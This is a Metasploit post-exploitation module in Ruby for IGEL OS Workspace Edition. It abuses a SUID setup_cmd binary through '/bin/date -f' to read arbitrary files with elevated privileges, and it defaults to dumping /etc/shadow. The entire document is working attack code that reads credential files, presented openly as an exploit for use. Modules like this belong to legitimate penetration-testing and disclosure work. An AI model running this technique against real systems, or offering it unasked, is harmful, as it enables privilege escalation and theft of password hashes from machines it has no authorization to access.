##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IGEL OS Dump File',
        'Description' => %q{
          Dump a file with escalated privileges for IGEL OS Workspace Edition sessions,
          by elevating rights with setup_cmd (SUID) and outputting with date.
        },
        'Author' => 'Zack Didcott',
        'License' => MSF_LICENSE,
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '2024-05-16',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptString.new('RPATH', [true, 'File on the target to dump', '/etc/shadow'])
    ])
  end

  def run
    print_status('Executing command on target')
    output = cmd_exec("/config/bin/setup_cmd /bin/date -f #{datastore['RPATH']}")

    print_status('Command completed:')
    output.lines[1..].each do |line|
      line = line.strip
      print_line(line.delete_prefix(
        '/bin/date: invalid date ‘'
      ).delete_suffix('’'))
    end
  end
end
